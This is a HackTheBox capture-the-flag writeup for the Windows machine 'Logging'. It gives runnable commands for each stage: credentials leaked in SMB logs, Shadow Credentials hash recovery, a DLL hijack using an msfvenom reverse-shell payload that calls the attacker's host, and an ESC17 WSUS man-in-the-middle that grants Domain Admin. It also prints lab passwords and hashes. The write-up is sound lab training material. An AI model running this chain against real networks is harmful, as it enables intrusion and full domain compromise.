---
title: "Logging — HackTheBox Writeup (Windows Medium)"
published: 2026-07-17
description: "Writeup for the Logging machine on HackTheBox Season 10 — Windows Medium. Chain: credential exposure in SMB logs → Shadow Credentials → DLL Hijacking → ESC17 WSUS MITM → Domain Admin."
image: "/assets/images/writeups/logging/cover.png"
tags: [HackTheBox, Active Directory, Windows, Medium, ADCS, WSUS, "DLL Hijacking", "Shadow Credentials", ESC17]
category: Writeups
draft: false
---

## Overview

**Logging** is a Windows Medium machine from HackTheBox Season 10 that simulates a realistic Active Directory environment. The attack chain requires chaining multiple techniques across different phases — from credential exposure in SMB log files all the way to Domain Admin via a WSUS man-in-the-middle attack.

**Topics covered:**

- SMB share enumeration and log file analysis to extract leaked credentials
- Kerberos authentication bypass when NTLM logon paths are restricted (`STATUS_ACCOUNT_RESTRICTION`)
- BloodHound-assisted Active Directory enumeration
- **Shadow Credentials** attack — abusing `GenericWrite` on a machine account via `msDS-KeyCredentialLink` injection and PKINIT to recover an NT hash
- **DLL Hijacking** through a writable directory used by a scheduled task running under a privileged user
- **Active Directory Certificate Services (ADCS)** enumeration with certipy
- **ESC17** — WSUS MITM attack chain combining ADIDNS record injection, Enrollee-Supplied Subject certificate abuse (`Server Authentication` EKU), and a malicious update served via `wsuks` to escalate to Domain Admin

---

:::note
As is common in real-life pentests, you will start the Logging box with credentials for the following account: `wallace.everette / Welcome2026@`
:::

## Initial Access

### Nmap

```bash
┌──(tazarni㉿kali)-[~/…/season10/win/medium/logging]
└─$ nmap -sC -sV -Pn 10.129.40.39 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-19 14:59 +01
Nmap scan report for DC01.logging.htb (10.129.40.39)
Host is up (0.11s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb0.)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  ssl/ldap
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8530/tcp  open  http          Microsoft IIS httpd 10.0
8531/tcp  open  ssl/http      Microsoft IIS httpd 10.0
9389/tcp  open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Generating the hosts file with nxc:

```bash
┌──(tazarni㉿kali)-[~/…/season10/win/medium/logging]
└─$ nxc smb 10.129.40.39 --generate-hosts-file hosts
SMB  10.129.40.39  445  DC01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb)

┌──(tazarni㉿kali)-[~/…/season10/win/medium/logging]
└─$ cat hosts | sudo tee -a /etc/hosts
10.129.40.39     DC01.logging.htb logging.htb DC01
```

Anonymous login fails:

```bash
┌──(tazarni㉿kali)-[~/…/season10/win/medium/logging]
└─$ nxc smb 10.129.40.39 -u 'Guest' -p ''
SMB  10.129.40.39  445  DC01  [-] logging.htb\Guest: STATUS_ACCOUNT_DISABLED
```

### Kerberoasting & AS-REP Roasting

```bash
┌──(tazarni㉿kali)-[~/…/season10/win/medium/logging]
└─$ impacket-GetNPUsers logging.htb/wallace.everette:'Welcome2026@' -dc-ip 10.129.40.39
No entries found!

┌──(tazarni㉿kali)-[~/…/season10/win/medium/logging]
└─$ impacket-GetUserSPNs logging.htb/wallace.everette:'Welcome2026@' -dc-ip 10.129.40.39
No entries found!
```

No vulnerable users found.

### User Enumeration

```bash
┌──(tazarni㉿kali)-[~/…/season10/win/medium/logging]
└─$ nxc smb 10.129.40.39 -u 'wallace.everette' -p 'Welcome2026@' --users
SMB  10.129.40.39  445  DC01  [+] logging.htb\wallace.everette:Welcome2026@
SMB  10.129.40.39  445  DC01  Administrator  / Guest / krbtgt / svc_recovery
SMB  10.129.40.39  445  DC01  jaylee.clifton / monique.chip / kyson.abel
SMB  10.129.40.39  445  DC01  fable.milford / wellington.kylan / serina.philander
SMB  10.129.40.39  445  DC01  wallace.everette / toby.brynleigh
```

### SMB Share Enumeration

```bash
┌──(tazarni㉿kali)-[~/…/season10/win/medium/logging]
└─$ nxc smb 10.129.40.39 -u 'wallace.everette' -p 'Welcome2026@' --shares
SMB  10.129.40.39  445  DC01  Share      Permissions  Remark
SMB  10.129.40.39  445  DC01  ADMIN$                  Remote Admin
SMB  10.129.40.39  445  DC01  C$                      Default share
SMB  10.129.40.39  445  DC01  IPC$       READ          Remote IPC
SMB  10.129.40.39  445  DC01  Logs       READ
SMB  10.129.40.39  445  DC01  NETLOGON   READ          Logon server share
SMB  10.129.40.39  445  DC01  SYSVOL     READ          Logon server share
SMB  10.129.40.39  445  DC01  WSUSTemp                 A network share used by Local Publishing
```

Two interesting shares: `Logs` and `WSUSTemp`. I only have access to `Logs`:

```bash
┌──(tazarni㉿kali)-[~/…/season10/win/medium/logging]
└─$ smbclient //10.129.40.39/Logs -U 'wallace.everette'
smb: \> ls
  Audit_Heartbeat.log
  IdentitySync_Trace_20260219.log
  Service_State.log
  TaskMonitor.log

smb: \> prompt off
smb: \> mget *
```

Inside `IdentitySync_Trace_20260219.log`, I found another domain name:

![Domain name found in log file](/assets/images/writeups/logging/image-1.png)

And domain credentials:

![Credentials found in log file](/assets/images/writeups/logging/image-2.png)

```
svc_recovery : Em3rg3ncyPa$$2025
```

The credentials failed over SMB:

```bash
┌──(tazarni㉿kali)-[~/…/season10/win/medium/logging]
└─$ nxc smb 10.129.40.39 -u 'svc_recovery' -p 'Em3rg3ncyPa$$2025'
SMB  10.129.40.39  445  DC01  [-] logging.htb\svc_recovery:Em3rg3ncyPa$$2025 STATUS_ACCOUNT_RESTRICTION
```

### Logon Path Restriction → Kerberos

`STATUS_ACCOUNT_RESTRICTION` means this account is restricted to Kerberos only. Switching to `getTGT`:

```bash
┌──(tazarni㉿kali)-[~/…/season10/win/medium/logging]
└─$ impacket-getTGT logging.htb/svc_recovery:'Em3rg3ncyPa$$2025'
KDC_ERR_PREAUTH_FAILED (Pre-authentication information was invalid)
```

The password contains `2025` and we're in 2026 — likely rotated annually. Trying with `2026`:

```bash
┌──(tazarni㉿kali)-[~/…/season10/win/medium/logging]
└─$ faketime "$(ntpdate -q 10.129.40.39 | cut -d ' ' -f 1,2)" impacket-getTGT logging.htb/svc_recovery:'Em3rg3ncyPa$$2026'
[*] Saving ticket in svc_recovery.ccache

┌──(tazarni㉿kali)-[~/…/season10/win/medium/logging]
└─$ export KRB5CCNAME=svc_recovery.ccache
└─$ klist
Default principal: svc_recovery@LOGGING.HTB
Valid starting: 04/20/2026 01:22:07  Expires: 04/20/2026 05:22:07
```

### BloodHound

With a valid Kerberos ticket for `svc_recovery`, I ran BloodHound to enumerate AD relations:

![BloodHound enumeration](/assets/images/writeups/logging/image-3.png)

`svc_recovery` has **GenericWrite** over `MSA_HEALTH$`, allowing a **Shadow Credentials** attack. `MSA_HEALTH$` is also a member of **Remote Management Users**:

![MSA_HEALTH$ group membership](/assets/images/writeups/logging/image-4.png)

### Shadow Credentials

:::tip[What is Shadow Credentials?]
Shadow Credentials exploits the `msDS-KeyCredentialLink` attribute to inject a rogue public key into a target object. This allows authentication via PKINIT to request a TGT as the target, bypassing password requirements without changing them.
:::

**Step 1: Inject Key Credentials & Request TGT**

```bash
┌──(tazarni㉿kali)-[~/…/season10/win/medium/logging]
└─$ faketime "$(ntpdate -q 10.129.40.39 | cut -d ' ' -f 1,2)" bloodyAD --host dc01.logging.htb -d logging.htb -k add shadowCredentials 'MSA_HEALTH$'
[+] KeyCredential generated with sha256: 8bbd425856a89575c5409bda681aacb4fb44a0dac8d183d03831efdb1f33db0e
[+] Saved PEM certificate at path: KcUUTu4Z_cert.pem
[+] Saved PEM private key at path: KcUUTu4Z_priv.pem

└─$ faketime "$(ntpdate -q 10.129.40.39 | cut -d ' ' -f 1,2)" python3 /opt/AD-tools/PKINITtools/gettgtpkinit.py \
    -cert-pem KcUUTu4Z_cert.pem -key-pem KcUUTu4Z_priv.pem logging.htb/MSA_HEALTH$ KcUUTu4Z.ccache
[*] AS-REP encryption key: 14c5d5feab7d07395f3dc0eb6e6604b2d149f24c4a98bd655d3b886b442f3ce9
[*] Saved TGT to file
```

**Step 2: Extract NT Hash via PKINIT**

```bash
┌──(tazarni㉿kali)-[~/…/season10/win/medium/logging]
└─$ export KRB5CCNAME=KcUUTu4Z.ccache
└─$ faketime "$(ntpdate -q 10.129.40.39 | cut -d ' ' -f 1,2)" python3 /opt/AD-tools/PKINITtools/getnthash.py \
    -key 14c5d5feab7d07395f3dc0eb6e6604b2d149f24c4a98bd655d3b886b442f3ce9 logging.htb/MSA_HEALTH$
Recovered NT Hash
603fc24ee01a9409f83c9d1d701485c5
```

Now authenticating via WinRM with the hash:

```bash
┌──(tazarni㉿kali)-[~/…/season10/win/medium/logging]
└─$ evil-winrm -i logging.htb -u 'MSA_HEALTH$' -H '603fc24ee01a9409f83c9d1d701485c5'

*Evil-WinRM* PS C:\Users\MSA_HEALTH$> whoami /priv
SeMachineAccountPrivilege     Enabled
SeChangeNotifyPrivilege       Enabled
SeIncreaseWorkingSetPrivilege Enabled
```

---

Running WinPEAS revealed an interesting scheduled task:

![WinPEAS — scheduled task](/assets/images/writeups/logging/image-5.png)

The `IT` group has full control over `C:\Program Files\UpdateMonitor`:

```bash
*Evil-WinRM* PS C:\Users\msa_health$\Documents> icacls "C:\Program Files\UpdateMonitor"
C:\Program Files\UpdateMonitor logging\IT:(OI)(CI)(F)
                               NT AUTHORITY\SYSTEM:(I)(F)
                               BUILTIN\Administrators:(I)(F)
                               BUILTIN\Users:(I)(RX)
```

The only member of the `IT` group is `JAYLEE.CLIFTON`:

![IT group member](/assets/images/writeups/logging/image-6.png)

Inside `C:\ProgramData\UpdateMonitor\Logs\monitor.log`, the service fails to load `settings_update.dll`:

![DLL not found in monitor.log](/assets/images/writeups/logging/image-7.png)

This is a clear **DLL Hijacking** vulnerability. Confirming write access:

```bash
*Evil-WinRM* PS C:\Temp> icacls "C:\ProgramData\UpdateMonitor"
C:\ProgramData\UpdateMonitor BUILTIN\Users:(I)(CI)(WD,AD,WEA,W)
```

`BUILTIN\Users` has write access — we can plant the DLL.

### DLL Hijacking

The program reads from `C:\ProgramData\UpdateMonitor\Settings_Update.zip` and loads the DLL inside it.

**Step 1: Generate malicious DLL inside zip**

```bash
┌──(tazarni㉿kali)-[~/…/season10/win/medium/logging]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.30 LPORT=1337 -f dll -o settings_update.dll
Payload size: 460 bytes / Final size of dll file: 9216 bytes

└─$ zip Settings_Update.zip settings_update.dll
  adding: settings_update.dll (deflated 80%)
```

**Step 2: Upload to target path**

```bash
*Evil-WinRM* PS > upload Settings_Update.zip
Info: Uploading to C:\ProgramData\UpdateMonitor\Settings_Update.zip
Info: Upload successful!
```

Checking `monitor.log` confirms the DLL loaded successfully:

![DLL loaded successfully](/assets/images/writeups/logging/image-8.png)

Shell received as `jaylee.clifton`:

```bash
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.15.30:1337
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: logging\jaylee.clifton
```

**User flag:**

```bash
C:\Windows\system32> type C:\Users\jaylee.clifton\Desktop\user.txt
1a7d229d8a871c4f837c98c2f9b08142
```

# Root Flag

### ESC17 — WSUS MITM Attack

`jaylee.clifton` is a member of **Performance Log Users**:

![Performance Log Users group](/assets/images/writeups/logging/image-9.png)

Inside `C:\Users\jaylee.clifton\Documents\Tickets\`, there is a file `Incident_4922_WSUS_Remediation_ViewExport.html`:

![WSUS incident file hint](/assets/images/writeups/logging/image-10.png)

This hints at an ADIDNS abuse against `wsus.logging.htb`. The registry confirms WSUS runs on `https://wsus.logging.htb:8531`:

```bash
PS C:\Users\jaylee.clifton\Documents\Tickets> reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v wuserver
    wuserver    REG_SZ    https://wsus.logging.htb:8531
```

Extracting `jaylee.clifton`'s ticket with Rubeus and exporting to ccache for use on Kali:

```bash
PS > .\Rubeus.exe tgtdeleg /nowrap
[+] base64(ticket.kirbi): doIFyDCCBcS...

$ base64 -d ticket.b64 > ticket.kirbi
$ impacket-ticketConverter ticket.kirbi ticket.ccache
$ export KRB5CCNAME=ticket.ccache
```

Scanning ADCS with certipy reveals the `UpdateSrv` template:

```
Template Name         : UpdateSrv
Enrollee Supplies Subject : True
EKU                   : Server Authentication
Enrollment Rights     : LOGGING.HTB\IT
```

:::tip[ESC17 — What is it?]
ESC17 occurs when an AD CS template allows **Enrollee-Supplied SANs** with **Server Authentication** EKU only. Administrators who mitigated ESC1 by removing "Client Authentication" left the door open for WSUS MITM attacks when user-supplied SANs remain enabled.
:::

![ESC17 attack diagram](/assets/images/writeups/logging/image-11.png)

**Attack chain:**
1. Abuse ADIDNS to point `wsus.logging.htb` to my machine
2. Request a domain-signed TLS certificate for `wsus.logging.htb`
3. Serve a malicious update — victim accepts the TLS handshake with the legitimate cert

**Step 1: ADIDNS — point wsus to my machine**

```bash
└─$ faketime "$(ntpdate -q logging.htb | cut -d ' ' -f 1,2)" bloodyAD -k -d logging.htb \
    --host dc01.logging.htb add dnsRecord wsus 10.10.15.30
[+] wsus has been successfully added

PS> nslookup wsus.logging.htb
Name:    wsus.logging.htb
Address:  10.10.15.30
```

**Step 2: Request TLS certificate for WSUS FQDN**

```bash
└─$ faketime "$(ntpdate -q logging.htb | cut -d ' ' -f 1,2)" certipy-ad req -k \
    -u 'jaylee.clifton' -ca 'logging-DC01-CA' -target 'dc01.logging.htb' \
    -template 'UpdateSrv' -dns 'wsus.logging.htb'
[*] Got certificate with DNS Host Name 'wsus.logging.htb'
[*] Saved certificate and private key to 'wsus.pfx'

$ openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes -passin pass:
```

**Step 3: Serve malicious update with wsuks**

Since I already have the NT hash of `MSA_HEALTH$`, I serve an update that adds it to Domain Admins:

```bash
sudo wsuks --serve-only \
    --WSUS-Server wsus.logging.htb \
    --tls-cert wsus.pem \
    -I tun0 \
    -c '/accepteula /s powershell.exe -ExecutionPolicy Bypass -Command "Add-ADGroupMember -Identity \"Domain Admins\" -Members \"MSA_HEALTH$\""'

[+] Received POST requests... update served and downloaded.
```

After a few minutes, the victim downloaded the update — `MSA_HEALTH$` is now Domain Admin:

![MSA_HEALTH$ granted Domain Admin](/assets/images/writeups/logging/image-12.png)

**Root flag captured:**

![Root flag](/assets/images/writeups/logging/image-13.png)
